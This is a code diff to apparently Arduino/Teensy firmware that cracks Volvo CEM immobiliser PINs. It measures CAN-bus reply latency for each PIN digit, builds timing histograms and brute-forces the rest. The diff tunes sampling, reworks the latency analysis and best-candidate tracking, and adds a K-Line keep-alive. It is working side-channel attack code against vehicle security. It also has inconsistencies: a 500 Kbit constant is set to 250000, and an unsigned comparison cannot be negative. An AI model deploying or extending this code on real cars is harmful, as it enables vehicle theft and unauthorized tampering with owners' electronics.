@@ -80,9 +80,8 @@
 #define PLATFORM_P2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */
 
 #define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
-#define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
+#define SAMPLES        10   /* number of samples per sequence, more is better (up to 100) */
 #define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
-#define NUM_LOOPS      1000 /* how many loops to do when calculating crack rate */
 
 /* end of tunable parameters */
 
@@ -118,24 +117,18 @@
 #define BUCKETS_PER_US        1                    /* how many buckets per microsecond do we store (1 means 1us resolution */
 #define CEM_REPLY_DELAY_US    (30*BUCKETS_PER_US)  /* minimum time in us for CEM to reply for PIN unlock command (approx) */
 #define CEM_REPLY_TIMEOUT_MS  2                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
-#define HISTOGRAM_DISPLAY_MIN 80                   /* minimum count for histogram display */
-#define HISTOGRAM_DISPLAY_MAX 94                   /* maximum count for histogram display */
 
-const uint32_t shuffleOrder[] = { 3, 1, 5, 0, 2, 4 };
+//const uint32_t shuffleOrder[] = { 3, 1, 5, 0, 2, 4 };
+const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
 
 #elif defined(PLATFORM_P1)
 
 /* P1 platform settings: S40, V50, C30, C70 */
 
 #define BUCKETS_PER_US        4                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
-#define AVERAGE_DELTA_MIN     (16*BUCKETS_PER_US)  /* buckets to look at before the rolling average */
-#define AVERAGE_DELTA_MAX     (32*BUCKETS_PER_US)  /* buckets to look at after the rolling average  */
 #define CEM_REPLY_DELAY_US    (200*BUCKETS_PER_US) /* minimum time in us for CEM to reply for PIN unlock command (approx) */
 #define CEM_REPLY_TIMEOUT_MS  2                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
-#define HISTOGRAM_DISPLAY_MIN 8                    /* minimum count for histogram display (8us below average) */
-#define HISTOGRAM_DISPLAY_MAX 24                   /* maximum count for histogram display (24us above average) */
 
-#undef  DUMP_BUCKETS                               /* dump all buckets for debugging */
 #define USE_ROLLING_AVERAGE                        /* use a rolling average latency for choosing measurements */ 
 
 /* P1 processes the key in order
@@ -148,6 +141,10 @@ const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
 #else
 #error Platform required        /* must pick PLATFORM_P1 or PLATFORM_P2 above */
 #endif
+
+//#define  DUMP_BUCKETS                               /* dump all buckets for debugging */
+#define AVERAGE_DELTA_MIN     (-8*BUCKETS_PER_US)  /* buckets to look at before the rolling average */
+#define AVERAGE_DELTA_MAX     (8*BUCKETS_PER_US)  /* buckets to look at after the rolling average  */
 
 /* hardware defintions */
 
@@ -169,7 +166,7 @@ MCP_CAN CAN_LS(CAN_LS_CS_PIN);
 
 #define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */
 
-#define CAN_500KBPS 500000      /* 500 Kbit speed */
+#define CAN_500KBPS 250000      /* 500 Kbit speed */
 #define CAN_125KBPS 125000      /* 125 Kbit speed */
 
 #define CAN_HS_SPEED CAN_500KBPS
@@ -214,7 +211,7 @@ typedef enum {
 
 #define TSC ARM_DWT_CYCCNT
 
-#define CEM_REPLY_US (200 * BUCKETS_PER_US)
+#define CEM_REPLY_US (400 * BUCKETS_PER_US)
 
 #define printf Serial.printf
 
@@ -229,7 +226,7 @@ typedef enum {
 
 #define PIN_LEN         6       /* a PIN has 6 bytes */
 
-uint32_t averageReponse = 0;
+uint32_t averageResponse = 0;
 
 /* measured latencies are stored for each of possible value of a single PIN digit */
 
@@ -477,8 +474,9 @@ uint32_t profileCemResponse (void)
   uint32_t latency;
   uint32_t rate;
   bool     verbose = false;
+  uint32_t i;
 
-  averageReponse = 0;
+  averageResponse = 0;
 
   /* start time in milliseconds */
 
@@ -486,7 +484,7 @@ uint32_t profileCemResponse (void)
 
   /* collect the samples */
 
-  for (uint32_t i = 0; i < NUM_LOOPS; i++) {
+  for (i = 0; i < 1000; i++) {
 
     /* average calculation is more reliable using random PIN digits */
 
@@ -498,7 +496,7 @@ uint32_t profileCemResponse (void)
 
     /* keep a running total of the average latency */
 
-    averageReponse += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
+    averageResponse += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
   }
 
   /* end time in milliseconds */
@@ -507,14 +505,13 @@ uint32_t profileCemResponse (void)
 
   /* calculate the average latency for a single response */
 
-  averageReponse = averageReponse / NUM_LOOPS;
+  averageResponse = averageResponse / 1000;
 
   /* number of PINs processed per second */
 
-  rate = 1000 * NUM_LOOPS / (end - start);
+  rate = 1e6 / (end - start);
 
-  printf ("%u pins in %u ms, %u pins/s, average response: %u\n", NUM_LOOPS, (end - start), rate, averageReponse);
-
+  printf ("1000 pins in %u ms, %u pins/s, average response: %u us\n", (end - start), rate, averageResponse);
   return rate;
 }
 
@@ -561,8 +558,9 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   pMsgPin[shuffleOrder[4]] = pin[4];
   pMsgPin[shuffleOrder[5]] = pin[5];
 
-  /* send the unlock request */
+  uint32_t clk_rate = clockCyclesPerMicrosecond();
 
+  /* send the unlock request */
   canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
 
   /* clear current interrupt status */
@@ -590,7 +588,7 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   for (sampleCount = 0, start = TSC;
       (canInterruptReceived == false) && 
       (millis () < limit) &&
-      (maxTime < CEM_REPLY_DELAY_US * clockCyclesPerMicrosecond ());) {
+      (maxTime < CEM_REPLY_DELAY_US * clk_rate);) {
 
     /* if the line is high, the CAN bus is either idle or transmitting a bit */
 
@@ -788,6 +786,8 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   uint8_t  pin2;
   uint32_t i;
   uint32_t k;
+  int best = 0;
+  uint32_t best_prod = 0;
 
   /* we process three digits in this code */
 
@@ -796,6 +796,11 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   /* clear collected latencies */
 
   memset (sequence, 0, sizeof(sequence));
+
+  printf("                   us: ");
+  for (i = averageResponse + AVERAGE_DELTA_MIN; i < averageResponse + AVERAGE_DELTA_MAX; i++)
+    printf("%5d ", i);
+  printf("\n");
 
   /* iterate over all possible values for the PIN digit */
 
@@ -842,7 +847,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* iterate the next PIN digit (third digit) */
 
-        pin[pos + 2] = binToBcd ((uint8_t)(j & 0xff));
+        pin[pos + 2] = binToBcd ((uint8_t)(j % 100));
 
         /* try and unlock and measure the latency */
 
@@ -872,84 +877,25 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
     prod = 0;
     sum  = 0;
 
-#if defined(PLATFORM_P2)
-
     /* loop over the histogram values */
 
-    for (k = 0; k < CEM_REPLY_US; k++) {
-
-      /* print the latency histogram for relevant values */
-
-      if ((k >= HISTOGRAM_DISPLAY_MIN) &&
-          (k <= HISTOGRAM_DISPLAY_MAX)) {
-        printf ("%03u ", histogram[k]);
-      }
-
-      /* produce a weighted count of all entries */
-
-      prod += histogram[k] * k;
-      sum  += histogram[k];
-    }
-
-    printf (": %u\n", prod);
-
-    /* store the weighted count for this PIN value */
-
-    sequence[pin1].pinValue = pin[pos];
-    sequence[pin1].latency  = prod;
-
-#elif defined(PLATFORM_P1)
-
-    /* dump buckets for debug purposes */
-
-#if defined(DUMP_BUCKETS)
-    printf ("Average latency: %u\n", averageReponse);
-
-    for (k=0; k < CEM_REPLY_US; k++) {
-      if (histogram[k] != 0) {
-        printf ("%4u : %5u\n", k, histogram[k]);
-      }
-    }
-#endif
-
-    /* make sure the value for averageReponse is appropriate */
-
-    assert (averageReponse >= AVERAGE_DELTA_MIN);
-    assert (averageReponse < CEM_REPLY_US);
-
-    /* loop over the histogram values */
-
-#if defined(USE_ROLLING_AVERAGE)
-
-    /* selective use values based on average latency */
-
-    for (k = (averageReponse - AVERAGE_DELTA_MIN);
-         k < (averageReponse + AVERAGE_DELTA_MAX);
+    for (k = (averageResponse + AVERAGE_DELTA_MIN);
+         k < (averageResponse + AVERAGE_DELTA_MAX);
          k++) {
-#else
-
-    /* use all values collected */
-
-    for (k = 0; k < CEM_REPLY_US; k++) {
-#endif
-
       /* verify limit in case parameters are wrong */
 
       if (k > CEM_REPLY_US) {
         continue;
       }
 
-      /* print the latency histogram for relevant values */
-
-      if ((k > (averageReponse - HISTOGRAM_DISPLAY_MIN)) &&
-          (k < (averageReponse + HISTOGRAM_DISPLAY_MAX))) {
-        printf ("%03u ", histogram[k]);
-      }
+      printf ("% 5u ", histogram[k]);
 
       /* calculate weighted count and total of all entries */
 
-      prod += histogram[k] * k;
-      sum  += histogram[k];
+      if (k >= averageResponse) {
+        prod += histogram[k] * k;
+        sum  += histogram[k];
+      }
     }
 
     /* weighted average */
@@ -958,14 +904,28 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
     prod = prod / sum; 
 #endif
 
-    printf (": %u\n", prod);
+    printf (": % 10u. best 0x%02x is %s by %d\n", prod, binToBcd(best), best_prod - prod > 0 ? "greater" : "less", abs(best_prod - prod));
+
+    if (best_prod < prod) {
+      best_prod = prod;
+      best = pin1;
+    }
 
     /* store the weighted average count for this PIN value */
 
     sequence[pin1].pinValue = pin[pos];
     sequence[pin1].latency  = prod;
 
-#endif /* PLATFORM */
+
+#if defined(DUMP_BUCKETS)
+    printf ("Average latency: %u\n", averageResponse);
+
+    for (k=0; k < CEM_REPLY_US; k++) {
+      if (histogram[k] != 0) {
+        printf ("%4u : %5u\n", k, histogram[k]);
+      }
+    }
+#endif
 
   }
 
@@ -982,7 +942,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 #if defined(USE_ROLLING_AVERAGE)
   /* update the average latency for the next measurement */
 
-  averageReponse = sequence[0].latency;
+  averageResponse = sequence[0].latency;
 #endif
 
   /* choose the PIN value that has the highest latency */
@@ -1271,6 +1231,14 @@ void __assert__ (const char *__func, const char *__file,
   while (1);
 }
 
+void k_line_keep_alive()
+{
+  unsigned char msg[] = { 0x84, 0x40, 0x13, 0xb2, 0xf0, 0x03, 0x7c };
+
+  printf("K-Line keep alive\n");
+  Serial3.write(msg, sizeof(msg));
+}
+
 /*******************************************************************************
  *
  * setup - Arduino entry point for hardware configuration
@@ -1283,6 +1251,8 @@ void setup (void)
   /* set up the serial port */
 
   Serial.begin (115200);
+  Serial3.begin(10800); /* K-Line */
+
   delay (3000);
 
   /* set up the pin for sampling the CAN bus */
@@ -1293,7 +1263,7 @@ void setup (void)
 
   /* lowering the Teensy 4.x clock rate provides more consistent results */
 
-  set_arm_clock (180000000);
+//  set_arm_clock (180000000);
 #endif
 
   printf ("CPU Maximum Frequency:   %u\n", F_CPU);
@@ -1311,7 +1281,6 @@ void setup (void)
 #endif
   printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
   printf ("Number of samples:       %u\n", SAMPLES);
-  printf ("Number of loops:         %u\n\n", NUM_LOOPS);
 
 #if (HW_SELECTION == MCP2515_HW)
   mcp2515Init ();
@@ -1331,6 +1300,7 @@ void setup (void)
 
 void loop (void)
 {
+  k_line_keep_alive();
   bool verbose = false;
 
   /* drain any pending messages */
